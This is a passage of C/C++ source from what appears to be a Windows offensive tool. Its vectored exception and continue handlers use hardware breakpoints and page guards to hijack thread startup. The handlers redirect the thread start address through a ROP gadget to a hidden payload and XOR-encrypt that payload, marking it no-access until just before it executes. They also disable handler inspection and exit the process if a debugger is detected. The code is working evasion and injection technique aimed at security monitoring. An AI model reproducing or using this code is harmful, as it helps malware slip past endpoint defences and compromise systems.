        printf("[-] Failed to find ROP gadget.\n");
    }
} 

LPVOID syscall_addr_global = NULL; 
LPVOID syscall_ret_addr_global = NULL ;

// exception handler for hardware breakpoints
LONG WINAPI BreakpointHandlerVch(PEXCEPTION_POINTERS e)
{
    // printf("[+] !!!!!!!!!!!!! Hard BreakpointHandler\n");
    // // print the e->ExceptionRecord->ExceptionCode
    // printf("[+] Exception code: %x\n", e->ExceptionRecord->ExceptionCode);

    // if status is page guard violation: 
    if(e->ExceptionRecord->ExceptionCode == STATUS_GUARD_PAGE_VIOLATION || e->ExceptionRecord->ExceptionCode == STATUS_STACK_BUFFER_OVERRUN) {


        if(e->ExceptionRecord->ExceptionCode == 0x80000001) {
            printf("[!!!!] Page guard Access violation at address: %p\n", e->ExceptionRecord->ExceptionAddress);
        } else if (e->ExceptionRecord->ExceptionCode == 0xC0000409) {
            printf("[+] Stack buffer overrun detected.\n");
            printf("[+] Stack buffer overrun at address: %p\n", e->ExceptionRecord->ExceptionAddress);
        }
    
        // printf("[!!!!] Access violation at address: %p\n", e->ExceptionRecord->ExceptionAddress);
        printf("[+] Inside VCH!");
        // NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)dynamic::NotGetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
        // get NtCreateThreadEx address from ntdll
        
        //Print Rdx value:
        printf("[+] Rdx value: %p\n", e->ContextRecord->Rdx);
        
        // LPVOID NtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
		// if (e->ContextRecord->Rip == (DWORD64) SetCreateThread) {
        if (1 == 1) {
			printf("[!] Exception (%#llx)! Params:\n", e->ExceptionRecord->ExceptionAddress);
			printf("(1): %#llx | ", e->ContextRecord->Rcx);
			printf("(2): %#llx | ", e->ContextRecord->Rdx);
			printf("(3): %#llx | ", e->ContextRecord->R8);
			printf("(4): %#llx | ", e->ContextRecord->R9);
			printf("RSP = %#llx\n", e->ContextRecord->Rsp);
            //print the 5th argument:
            DWORD64 *fifthArgAddr = (DWORD64 *)(e->ContextRecord->Rsp + 0x28); 
            printf("[+] Rsp + 0x28 before change: %p\n", *fifthArgAddr);
            // *fifthArgAddr = (DWORD64)dllEntryPoint1; // Set your value
            // // print the value of 0x28 after the Rsp:
            // printf("[+] Rsp + 0x28 after change: %p\n", *fifthArgAddr);
			// getchar();
			//e->ContextRecord->Rip = (DWORD64) &prn;
            bool bRtlUserThreadStart = TRUE;


            CONTEXT thread_context = { 0 };
            pRtlUserThreadStart = (RtlUserThreadStart_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlUserThreadStart");
            // check if pRtlUserThreadStart is a valid address: 
            if (!pRtlUserThreadStart) {
                printf("[-] Failed to locate RtlUserThreadStart.\n");
                return FALSE;
            } else {
                printf("[+] Located RtlUserThreadStart.\n");
            }
            if (!FindSyscallInstruction((LPVOID)pRtlUserThreadStart, &syscall_addr_global, &syscall_ret_addr_global, TRUE, FALSE)) {
                return FALSE;
            }
            //print syscall_addr_global
            // printf("[+] syscall_addr_global should be equal to Found mov r8, rdx: %p\n", syscall_addr_global);
            //print syscall_ret_addr
            // if syscall is RtlUserThreadStart, we need to break on the instruction after the syscall of NtCreateThreadEx
            if (bRtlUserThreadStart) {
                LPVOID syscall_addr_temp;

                pBaseThreadInitThunk = (BaseThreadInitThunk_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "BaseThreadInitThunk");

                if(!FindSyscallInstruction((PVOID)pBaseThreadInitThunk, &syscall_addr_temp, &syscall_ret_addr_global, FALSE, TRUE)) {
                    return FALSE;
                } else {
                    printf("[+] Syscall ret instruction for BaseThreadInitThunk at 0x%llx\n", (DWORD64)syscall_ret_addr_global);
                }

            }
            // print syscall_ret_addr
            printf("[+] syscall_ret_addr should be equal to previous one!!!: %p\n", syscall_ret_addr_global);

            //get thread context from exception pointer
            // thread_context = *e->ContextRecord;

            // dr7_t dr7 = { 0 };

            // /// dr0 - dr3 to set breakpoint as debug address registers. 
            // dr7.dr0_local = 1; // set DR0 as an execute breakpoint
            // dr7.dr1_local = 1; // set DR1 as an execute breakpoint

            // // thread_context.ContextFlags = CONTEXT_ALL;
            // e->ContextRecord->ContextFlags = CONTEXT_ALL;
            // // print e->ContextRecord->Dr0:
            // printf("[+] e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr0);
            // printf("[+] e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr1);
            // // print syscall_addr abd syscall_addr:
            // // printf("[+] syscall_addr: %p\n", syscall_addr);
            // // printf("[+] syscall_ret_addr: %p\n", syscall_ret_addr);

            // // thread_context.Dr0 = (DWORD64)syscall_addr;     // set DR0 to break on syscall address
            // e->ContextRecord->Dr0 = (DWORD64)syscall_addr;
            // // thread_context.Dr1 = (DWORD64)syscall_ret_addr; // set DR1 to break on syscall ret address
            // e->ContextRecord->Dr1 = (DWORD64)syscall_ret_addr;
            // // thread_context.Dr7 = *(DWORD*)&dr7;
            // e->ContextRecord->Dr7 = *(DWORD*)&dr7;

            // // CONTEXT context = *(ExceptionInfo->ContextRecord);
            // CONTEXT* context = e->ContextRecord;
            // // Define and initialize the DR7 structure
            // dr7_t dr7 = { 0 };

            // // Enable local breakpoints for DR0 and DR1
            // dr7.dr0_local = 1;
            // dr7.dr1_local = 1;
            // // Set the address for the breakpoints in DR0 and DR1
            // // Set the address for the breakpoints in DR0 and DR1
            // context->Dr0 = (DWORD64)syscall_addr;
            // context->Dr1 = (DWORD64)syscall_ret_addr;
            // // Copy the DR7 structure into the context's Dr7 register
            // context->Dr7 = *reinterpret_cast<DWORD64*>(&dr7);
            // // Ensure ContextFlags is set properly
            // context->ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS;
            // // context->EFlags |= (1 << 16); // Resume flag
            // // Print the changes for verification
            // SetUnhandledExceptionFilter(BreakpointHandler);
            // suspended the thread:
            // define it  type :
			// dwReturnAddress = *(NATIVE_VALUE *)CURRENT_EXCEPTION_STACK_PTR;
			e->ContextRecord->Dr0 = (DWORD64)syscall_addr_global;
            e->ContextRecord->Dr1 = (DWORD64)syscall_ret_addr_global;
			e->ContextRecord->Dr7 |= DEBUG_REGISTER_EXEC_DR0;
            e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR1;
            printf("[+] After change: e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr0);
            printf("[+] After change: e->ContextRecord->Dr1: %p\n", e->ContextRecord->Dr1);
            printf("[+] After change: e->ContextRecord->Dr7: %p\n", e->ContextRecord->Dr7);

            // NtSuspendThread(g_thread_handle, NULL);
            // SetThreadContext(g_thread_handle, context);
            // resume thread: 
            // NtResumeThread(g_thread_handle, NULL);
            // e->ContextRecord->Rip = (DWORD64) syscall_addr;
            // MyRtlAddVectoredContinueHandler(1, &BreakpointHandler);


            
        }
        
        // return EXCEPTION_CONTINUE_EXECUTION;
        // e->ContextRecord->EFlags |= (1 << 8);	// Trap Flag
        
        // e->ContextRecord->EFlags |= (1 << 16);
        

        e->ContextRecord->EFlags |= SINGLE_STEP_FLAG; //single step after this exception, 
		return EXCEPTION_CONTINUE_EXECUTION;

    } 
    
    
    // else if (e->ExceptionRecord->ExceptionCode == STATUS_ACCESS_VIOLATION) {
    //     printf("[+] Access violation at address: %p\n", e->ExceptionRecord->ExceptionAddress);
    //     return EXCEPTION_CONTINUE_SEARCH;
    // } 
    
    else if (e->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {


        DWORD threadId = GetCurrentThreadId();
        // printf("[+] Current Thread ID: %p\n", threadId);
        //print g_thread_handle
        // printf("[+] g_thread_handle: %p\n", GetThreadId(g_thread_handle));
        // //print g_thread_handle2:
        DWORD g_thread_handle2Id = GetThreadId(g_thread_handle2);
        // printf("[+] g_thread_handle2: %p\n", g_thread_handle2Id);

        if(threadId == g_thread_handle2Id) { 
            // // hardware breakpoints trigger a single step exception
            // printf("[+] Single step exception at address: %p\n", e->ExceptionRecord->ExceptionAddress);
            // printf("[+] e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr0);
            // printf("[+] e->ContextRecord->Dr1: %p\n", e->ContextRecord->Dr1);
            // printf("[+] e->ContextRecord->Dr7: %p\n", e->ContextRecord->Dr7);
            // //printf syscall_addr:
            // printf("[+] syscall_addr_global: %p\n", syscall_addr_global);
            // e->ContextRecord->Dr0 = (DWORD64)syscall_addr_global;
            // e->ContextRecord->Dr1 = (DWORD64)syscall_ret_addr_global;
            // e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR0;
            // e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR1;
            
            //print CURRENT_EXCEPTION_INSTRUCTION_PTR:
            // printf("[+] CURRENT_EXCEPTION_INSTRUCTION_PTR: %p\n", CURRENT_EXCEPTION_INSTRUCTION_PTR);
            // if(CURRENT_EXCEPTION_INSTRUCTION_PTR != e->ContextRecord->Dr0) //Rip == Dr0-> ?
            // {   
            //     printf("[+] Rip != Dr0\n");
            //     e->ContextRecord->Dr0 = (DWORD64)syscall_addr_global;
            //     e->ContextRecord->Dr1 = (DWORD64)syscall_ret_addr_global;
            //     e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR0;
            //     e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR1;
            //     printf("[+] e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr0);
            //     printf("[+] e->ContextRecord->Dr1: %p\n", e->ContextRecord->Dr1);
            //     printf("[+] e->ContextRecord->Dr7: %p\n", e->ContextRecord->Dr7);


            //     e->ContextRecord->EFlags |= SINGLE_STEP_FLAG;
            //     return EXCEPTION_CONTINUE_SEARCH;
            // }        
            if(CURRENT_EXCEPTION_INSTRUCTION_PTR == e->ContextRecord->Dr0) {
                printf("[^_^] syscall breakpoint triggered at address: 0x%llx\n",
                    (DWORD64)e->ExceptionRecord->ExceptionAddress);
                printf("[*_*] This is VCH (vectored continue handler)!!!\n");



                // replace the fake parameters with the real ones
                // Case 1: NtCreateThreadEx Set:
                // change R10 to a benign code location...., it is for the fifth arg for NtCreateThreadEx

                /// print the value of Rcx Rdx, R8, R9, R10 to check if they are correct:
                printf("[+] Rcx: %p\n", e->ContextRecord->Rcx);
                // printf("[+] Rdx: %p\n", e->ContextRecord->Rdx);
                // printf("[+] R8: %p\n", e->ContextRecord->R8);
                // printf("[+] R9: %p\n", e->ContextRecord->R9);
                // printf("[+] R10: %p\n", e->ContextRecord->R10);
                // //print rax:
                // printf("[+] Rax: %p\n", e->ContextRecord->Rax);


                //Change rcx for RtlUserThreadStart, Rcx stores the value of Thread Start Address that will be passed on to Rdx later. 
                globalPointer = (PVOID)0X88888;
                e->ContextRecord->Rcx = (DWORD64)globalPointer; // 1st arg
                printf("[+] Rcx changed to globalPointer: %p\n", e->ContextRecord->Rcx);
                // e->ContextRecord->Rax = (DWORD64)dllEntryPoint1; // change Rax to real start Addr, PVOID lpStartAddress
                // set for Rsp + 0x28:

                // context.Rsp points to the top of the stack
                // DWORD64 *fifthArgAddr = (DWORD64 *)(e->ContextRecord->Rsp + 0x28); 
                // printf("[+] Rsp + 0x28 before change: %p\n", *fifthArgAddr);
                // *fifthArgAddr = (DWORD64)dllEntryPoint1; // Set your value
                // // print the value of 0x28 after the Rsp:
                // printf("[+] Rsp + 0x28 after change: %p\n", *fifthArgAddr);

                // print the value of dllEntryPoint1 to check if it is correct:
                printf("[+] dllEntryPoint1: %p\n", dllEntryPoint1);
                printf("[+] compare it with the rcx of RtlUserThreadStart after change \n");
                printf("[+] magic code length: %lu\n", dll_len);
                //Call virtual protect with debug:
                
                // e->ContextRecord->R10 = (DWORD64)dllEntryPoint1; // change Rax to real start Addr, PVOID lpStartAddress


                // Change the thread entry to other address. 
                //XOR the magic code, change to page_noaccess
                

                //print tyhe key value:
                printf("[+] XOR key: ");
                for (int i = 0; i < 16; i++) {
                    printf("%02x", key[i]);
                }
                printf("\n"); 
                // encrypt the payload
                DWORD oldPal = 0;
                VirtualProtect(dllEntryPoint1, dll_len, PAGE_READWRITE, &oldPal);
                sUrprise((char *) dllEntryPoint1, dll_len, key, sizeof(key));
                printf("[+] Global dllEntryPoint1 memory encoded with XOR \n");
                printf("[+] press any key to continue\n");
                getchar();
                

                // set the memory inaccessible
                VirtualProtect(dllEntryPoint1, dll_len, PAGE_NOACCESS, &oldPal);
                printf("[+] Global dllEntryPoint1 memory set to PAGE_NOACCESS (%#x)\n", GetLastError());

                // e->ContextRecord->Dr0 = (DWORD64)syscall_addr_global;
                e->ContextRecord->Dr1 = (DWORD64)syscall_ret_addr_global;
                // e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR0;
                e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR1;
                printf("[+] After change: e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr0);
                printf("[+] After change: e->ContextRecord->Dr1: %p\n", e->ContextRecord->Dr1);
                printf("[+] After change: e->ContextRecord->Dr7: %p\n", e->ContextRecord->Dr7);
                // // //change the memory protection to PAGE_NOACCESS with NtProtectVirtualMemory:
                // [!] NtProtectVirtualMemory is DIFFERENT from VirtualProtect, can not be mixed with VirtualProtect
                // either use VirtualProtect or this function, not both.
                // NTSTATUS status = NtProtectVirtualMemory(
                // GetCurrentProcess(),
                // &dllEntryPoint1, // NtProtectVirtualMemory expects a pointer to the base address
                // &dll_len, // A pointer to the size of the region
                // PAGE_NOACCESS, // The new protection attributes, PAGE_NOACCESS
                // // PAGE_EXECUTE_WRITECOPY, 
                // &oldPal); // The old protection attributes
                // if(status != STATUS_SUCCESS) {
                //     printf("[-] NtProtectVirtualMemory failed to restore original memory protection. Status: %x\n", status);
                // } else {
                //     printf("[+] Memory protection before change was: %s\n", ProtectionToString(oldPal));
                //     printf("[+] Global dllEntryPoint1 memory set to PAGE_NOACCESS (%#x)\n", GetLastError());
                // }
                printf("[+] press any key to continue\n");
                getchar();
                // e->ContextRecord->EFlags |= (1 << 8);    // Trap Flag
            }

		
   
            // this exception was caused by DR1 (syscall ret breakpoint)
            // if (e->ContextRecord->Dr6 & 0x2) {
            else if (CURRENT_EXCEPTION_INSTRUCTION_PTR == e->ContextRecord->Dr1) {
                printf("[^_^] syscall ret breakpoint triggered at address: 0x%llx\n",
                    (DWORD64)e->ExceptionRecord->ExceptionAddress);
                printf("[*_*] This is vectored continue handler!!!\n"); 


                
                // use VirtualProcect to restore memory page to RX,
                // XOR magic code
                //Call NtResumeThread at magicCode address
                printf("[+] Restoring payload memory access and decrypting\n");
                DWORD oldPal = 0;
                // Change the memory back to XR for execution...
                VirtualProtect(dllEntryPoint1, dll_len, PAGE_READWRITE, &oldPal);
                sUrprise((char *) dllEntryPoint1, dll_len, key, sizeof(key));

                
                VirtualProtect(dllEntryPoint1, dll_len, PAGE_EXECUTE_READ, &oldPal);
                printf("[+] Global dllEntryPoint1 memory set to PAGE_EXECUTE_READ (%#x)\n", GetLastError());


                printf("[+] Rcx: %p\n", e->ContextRecord->Rcx);
                printf("[+] Rdx before change: %p\n", e->ContextRecord->Rdx);
                printf("[+] R8: %p\n", e->ContextRecord->R8);
                printf("[+] R9: %p\n", e->ContextRecord->R9);
                printf("[+] R10: %p\n", e->ContextRecord->R10);
                printf("[+] Rax: %p\n", e->ContextRecord->Rax); 
                // printf("The registers are cleared, there is no need to set them back to original values. \n");  

                /// We can unset the CrossProcessFlags before execution,
                /// so its value will be 0x0 instead of 0xc, only veh is hooked and inspected.  
                /// There is alternative method to do it by changing the CrossProcessFlags directly
                /// in the PEB. 
                // if(RemoveVectoredContinueHandler(continueHandle)) {
                //     printf("[+] Removed the vectored continue handler.\n");
                // } else {
                //     printf("[-] Failed to remove the vectored continue handler.\n");
                // }

                // if(RemoveVectoredExceptionHandler(expHandle)) {
                //     printf("[+] Removed the vectored exception handler.\n");
                // } else {
                //     printf("[-] Failed to remove the vectored exception handler.\n");
                // }

                LPVOID imageBaseAddress = ModifyHandlers(GetCurrentProcess(), FALSE);
                if (imageBaseAddress == NULL) {
                    printf("[-] Failed to disable VEH and VCH in desginated process\n");
                    return 1;
                } else {
                    printf("[+] Succseefully disable VEH and VCH in desginated process\n");
                    getchar();
                }


                // context.Rsp points to the top of the stack TOGO: 
                // DWORD64 *fifthArgAddr = (DWORD64 *)(e->ContextRecord->Rsp + 0x28); 
                // printf("[+] Rsp + 0x28 before change: %p\n", *fifthArgAddr);
                // *fifthArgAddr = (DWORD64)globalPointer; // Set your value
                // // // print the value of 0x28 after the Rsp:k
                // printf("[+] Rsp + 0x28 after change: %p\n", *fifthArgAddr);

                //Change rdx for NaseTjreadInitThunk, Rdx stores the value of Thread Start Address that will be passed on to Rcx later.:
                // e->ContextRecord->Rdx = (DWORD64)dllEntryPoint1; // 1st arg
                // printf("[+] Rdx changed to: %p\n", e->ContextRecord->Rdx);
                // // globalPointer = (PVOID)0X88888;
                // // e->ContextRecord->Rdx = (DWORD64)globalPointer; // 1st arg

                searchForROPGadget();
                e->ContextRecord->Rdx = (DWORD64)foundRemoteAddress; // The start address
                // e->ContextRecord->Rip = (DWORD64)foundRemoteAddress; // This works but will change the calling sequences. 
                // e->ContextRecord->Rax = (DWORD64)dllEntryPoint1;
                e->ContextRecord->R11 = (DWORD64)dllEntryPoint1; //It is safe to use caller saved register R11 for the real start address.
                
                // e->ContextRecord->Dr0 = (DWORD64)syscall_addr_global;
                e->ContextRecord->Dr1 = (DWORD64)0;
                // e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR0;
                e->ContextRecord->Dr7 &= DEBUG_REGISTER_EXEC_DR1; // clear the local bit
                printf("[+] After change: e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr0);
                printf("[+] After change: e->ContextRecord->Dr1: %p\n", e->ContextRecord->Dr1);
                printf("[+] After change: e->ContextRecord->Dr7: %p\n", e->ContextRecord->Dr7);
                // e->ContextRecord->Rax = (DWORD64)dllEntryPoint1; // change Rax to real start Addr, PVOID lpStartAddress

                // Code can be executed with Rip as well....
                // e->ContextRecord->Rip = (DWORD64)dllEntryPoint1; // change 5th to real start Addr, PVOID lpStartAddress

                // NTSTATUS status = NtProtectVirtualMemory(
                // GetCurrentProcess(),
                // &dllEntryPoint1, // NtProtectVirtualMemory expects a pointer to the base address
                // &dll_len, // A pointer to the size of the region
                // PAGE_EXECUTE_READ, // The new protection attributes, PAGE_EXECUTE_READ
                // // PAGE_EXECUTE_WRITECOPY, 
                // &oldPal); // The old protection attributes
                // if(status != STATUS_SUCCESS) {
                //     printf("[-] NtProtectVirtualMemory failed to restore original memory protection. Status: %x\n", status);
                // } else {
                //     printf("[+] Memory protection before change was: %s\n", ProtectionToString(oldPal));
                //     printf("[+] Global dllEntryPoint1 memory set to PAGE_EXECUTE_READ (%#x)\n", GetLastError());
                // }
                getchar();

                // If you want to play with it, but it is not useful for BaseThreadInitThunk
                
                // In case there is another handler behind us, we want to feed them some information
                // e->ContextRecord->Rax = 0xC0000156; // STATUS too many secrets.
                return EXCEPTION_CONTINUE_SEARCH;

            } 
            else {
                // e->ContextRecord->Dr0 = (DWORD64)syscall_addr_global;
                // e->ContextRecord->Dr1 = (DWORD64)syscall_ret_addr_global;
                // e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR0;
                // e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR1;
                printf("[-_-] Wrong place for breakpoint triggered at address: %p\n", e->ExceptionRecord->ExceptionAddress);
                // printf("[+] After change: e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr0);
                // printf("[+] After change: e->ContextRecord->Dr1: %p\n", e->ContextRecord->Dr1);
                // printf("[+] After change: e->ContextRecord->Dr7: %p\n", e->ContextRecord->Dr7);
                e->ContextRecord->EFlags |= (1 << 8); 
                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }
        
        return EXCEPTION_CONTINUE_EXECUTION;
	}

	e->ContextRecord->EFlags |= (1 << 16);  // set the ResumeFlag (FR) in EFlags register to continue execution, otherwise we have a loop.
	//e->ContextRecord->Rip++;						//use instruction pointer to skip the loop
    
	
    return EXCEPTION_CONTINUE_SEARCH;
    // return EXCEPTION_CONTINUE_EXECUTION;
}


// exception handler for hardware breakpoints
LONG WINAPI BreakpointHandlerVeh(PEXCEPTION_POINTERS e)
{
    // printf("[+] !!!!!!!!!!!!! Hard BreakpointHandler\n");
    // // print the e->ExceptionRecord->ExceptionCode
    // printf("[+] Exception code: %x\n", e->ExceptionRecord->ExceptionCode);

    // if status is page guard violation: 
    if(e->ExceptionRecord->ExceptionCode == STATUS_GUARD_PAGE_VIOLATION) {


        printf("[!!!!] Page guard Access violation at address: %p\n", e->ExceptionRecord->ExceptionAddress);
        printf("[+] Inside VEH, do nothing and pass control to VCH.\n");

        // a small trick to add a cherry on the top: 
        if ( e->ContextRecord->Dr0 || e->ContextRecord->Dr1 || e->ContextRecord->Dr2 || e->ContextRecord->Dr3 || e->ContextRecord->Dr6 || e->ContextRecord->Dr7) {
            e->ContextRecord = 0; // clear the context record
            // exit the program: 
            ExitProcess(0);
        } else {

            printf("[+] Inside PG, no debugger present. We may continue. \n");
        }
        // NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)dynamic::NotGetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
        // get NtCreateThreadEx address from ntdll
        
        // //Print Rdx value:
        // printf("[+] Rdx value: %p\n", e->ContextRecord->Rdx);
        
        // LPVOID NtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
		// if (e->ContextRecord->Rip == (DWORD64) SetCreateThread) {
        // if (1 == 1) {
		// 	printf("[!] Exception (%#llx)! Params:\n", e->ExceptionRecord->ExceptionAddress);
		// 	printf("(1): %#llx | ", e->ContextRecord->Rcx);
		// 	printf("(2): %#llx | ", e->ContextRecord->Rdx);
		// 	printf("(3): %#llx | ", e->ContextRecord->R8);
		// 	printf("(4): %#llx | ", e->ContextRecord->R9);
		// 	printf("RSP = %#llx\n", e->ContextRecord->Rsp);
        //     //print the 5th argument:
        //     DWORD64 *fifthArgAddr = (DWORD64 *)(e->ContextRecord->Rsp + 0x28); 
        //     printf("[+] Rsp + 0x28 before change: %p\n", *fifthArgAddr);
        //     // *fifthArgAddr = (DWORD64)dllEntryPoint1; // Set your value
        //     // // print the value of 0x28 after the Rsp:
        //     // printf("[+] Rsp + 0x28 after change: %p\n", *fifthArgAddr);
		// 	// getchar();
		// 	//e->ContextRecord->Rip = (DWORD64) &prn;
        //     bool bRtlUserThreadStart = TRUE;


        //     CONTEXT thread_context = { 0 };
        //     pRtlUserThreadStart = (RtlUserThreadStart_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlUserThreadStart");
        //     // check if pRtlUserThreadStart is a valid address: 
        //     if (!pRtlUserThreadStart) {
        //         printf("[-] Failed to locate RtlUserThreadStart.\n");
        //         return FALSE;
        //     } else {
        //         printf("[+] Located RtlUserThreadStart.\n");
        //     }
        //     if (!FindSyscallInstruction((LPVOID)pRtlUserThreadStart, &syscall_addr_global, &syscall_ret_addr_global, TRUE, FALSE)) {
        //         return FALSE;
        //     }
        //     //print syscall_addr_global
        //     // printf("[+] syscall_addr_global should be equal to Found mov r8, rdx: %p\n", syscall_addr_global);
        //     //print syscall_ret_addr
        //     // if syscall is RtlUserThreadStart, we need to break on the instruction after the syscall of NtCreateThreadEx
        //     if (bRtlUserThreadStart) {
        //         LPVOID syscall_addr_temp;

        //         pBaseThreadInitThunk = (BaseThreadInitThunk_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "BaseThreadInitThunk");

        //         if(!FindSyscallInstruction((PVOID)pBaseThreadInitThunk, &syscall_addr_temp, &syscall_ret_addr_global, FALSE, TRUE)) {
        //             return FALSE;
        //         } else {
        //             printf("[+] Syscall ret instruction for BaseThreadInitThunk at 0x%llx\n", (DWORD64)syscall_ret_addr_global);
        //         }

        //     }
        //     // print syscall_ret_addr
        //     printf("[+] syscall_ret_addr should be equal to previous one!!!: %p\n", syscall_ret_addr_global);

        //     //get thread context from exception pointer
        //     // thread_context = *e->ContextRecord;

        //     // dr7_t dr7 = { 0 };

        //     // /// dr0 - dr3 to set breakpoint as debug address registers. 
        //     // dr7.dr0_local = 1; // set DR0 as an execute breakpoint
        //     // dr7.dr1_local = 1; // set DR1 as an execute breakpoint

        //     // // thread_context.ContextFlags = CONTEXT_ALL;
        //     // e->ContextRecord->ContextFlags = CONTEXT_ALL;
        //     // // print e->ContextRecord->Dr0:
        //     // printf("[+] e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr0);
        //     // printf("[+] e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr1);
        //     // // print syscall_addr abd syscall_addr:
        //     // // printf("[+] syscall_addr: %p\n", syscall_addr);
        //     // // printf("[+] syscall_ret_addr: %p\n", syscall_ret_addr);

        //     // // thread_context.Dr0 = (DWORD64)syscall_addr;     // set DR0 to break on syscall address
        //     // e->ContextRecord->Dr0 = (DWORD64)syscall_addr;
        //     // // thread_context.Dr1 = (DWORD64)syscall_ret_addr; // set DR1 to break on syscall ret address
        //     // e->ContextRecord->Dr1 = (DWORD64)syscall_ret_addr;
        //     // // thread_context.Dr7 = *(DWORD*)&dr7;
        //     // e->ContextRecord->Dr7 = *(DWORD*)&dr7;

        //     // // CONTEXT context = *(ExceptionInfo->ContextRecord);
        //     // CONTEXT* context = e->ContextRecord;
        //     // // Define and initialize the DR7 structure
        //     // dr7_t dr7 = { 0 };

        //     // // Enable local breakpoints for DR0 and DR1
        //     // dr7.dr0_local = 1;
        //     // dr7.dr1_local = 1;
        //     // // Set the address for the breakpoints in DR0 and DR1
        //     // // Set the address for the breakpoints in DR0 and DR1
        //     // context->Dr0 = (DWORD64)syscall_addr;
        //     // context->Dr1 = (DWORD64)syscall_ret_addr;
        //     // // Copy the DR7 structure into the context's Dr7 register
        //     // context->Dr7 = *reinterpret_cast<DWORD64*>(&dr7);
        //     // // Ensure ContextFlags is set properly
        //     // context->ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS;
        //     // // context->EFlags |= (1 << 16); // Resume flag
        //     // // Print the changes for verification
        //     // SetUnhandledExceptionFilter(BreakpointHandler);
        //     // suspended the thread:
        //     // define it  type :
		// 	// dwReturnAddress = *(NATIVE_VALUE *)CURRENT_EXCEPTION_STACK_PTR;
		// 	e->ContextRecord->Dr0 = (DWORD64)syscall_addr_global;
        //     e->ContextRecord->Dr1 = (DWORD64)syscall_ret_addr_global;
		// 	e->ContextRecord->Dr7 |= DEBUG_REGISTER_EXEC_DR0;
        //     e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR1;
        //     printf("[+] After change: e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr0);
        //     printf("[+] After change: e->ContextRecord->Dr1: %p\n", e->ContextRecord->Dr1);
        //     printf("[+] After change: e->ContextRecord->Dr7: %p\n", e->ContextRecord->Dr7);

        //     // NtSuspendThread(g_thread_handle, NULL);
        //     // SetThreadContext(g_thread_handle, context);
        //     // resume thread: 
        //     // NtResumeThread(g_thread_handle, NULL);
        //     // e->ContextRecord->Rip = (DWORD64) syscall_addr;
        //     // MyRtlAddVectoredContinueHandler(1, &BreakpointHandler);


            
        // }
        
        // return EXCEPTION_CONTINUE_EXECUTION;
        // e->ContextRecord->EFlags |= (1 << 8);	// Trap Flag
        
        // e->ContextRecord->EFlags |= (1 << 16);
        
        DWORD threadId = GetCurrentThreadId();
        // printf("[+] Current Thread ID: %p\n", threadId);
        //print g_thread_handle
        // printf("[+] g_thread_handle: %p\n", GetThreadId(g_thread_handle));
        //print g_thread_handle2:
        DWORD g_thread_handle2Id = GetThreadId(g_thread_handle2);
        // printf("[+] g_thread_handle2: %p\n", g_thread_handle2Id);


        if(threadId == g_thread_handle2Id) {
            printf("[+] It is the right thread. \n");
            printf("[+] Single step exception at address: %p\n", e->ExceptionRecord->ExceptionAddress);
            getchar();
            
            // e->ContextRecord->EFlags |= SINGLE_STEP_FLAG; //single step after this exception
            // e->ContextRecord->EFlags |= (1 << 8); 

            return EXCEPTION_CONTINUE_EXECUTION;    
        } else {

            DWORD old;
            // VirtualProtect(reinterpret_cast<LPVOID>(WaitForSingleObject), 1, PAGE_EXECUTE_READ | PAGE_GUARD, &old);
            if(VirtualProtect(reinterpret_cast<LPVOID>(pRtlUserThreadStart), 1, PAGE_EXECUTE_READ | PAGE_GUARD, &old)) {
                printf("[+] Wrong thread, PAGE_GUARD set before pRtlUserThreadStart API. \n");
            } else {
                printf("[-] Failed to set PAGE_GUARD\n");
            }
            e->ContextRecord->EFlags |= (1 << 16);  // set the ResumeFlag (FR) in EFlags register to continue execution, otherwise we have a loop.
            return EXCEPTION_CONTINUE_EXECUTION;
        }

        return EXCEPTION_CONTINUE_EXECUTION;    

    } 
    
    
    // else if (e->ExceptionRecord->ExceptionCode == STATUS_ACCESS_VIOLATION) {
    //     printf("[+] Access violation at address: %p\n", e->ExceptionRecord->ExceptionAddress);
    //     return EXCEPTION_CONTINUE_SEARCH;
    // } 
    
    else if (e->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {

	    // // hardware breakpoints trigger a single step exception
        // printf("[+] Single step exception at address: %p\n", e->ExceptionRecord->ExceptionAddress);
        // printf("[+] e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr0);
        // printf("[+] e->ContextRecord->Dr1: %p\n", e->ContextRecord->Dr1);
        // printf("[+] e->ContextRecord->Dr7: %p\n", e->ContextRecord->Dr7);
        // //printf syscall_addr:
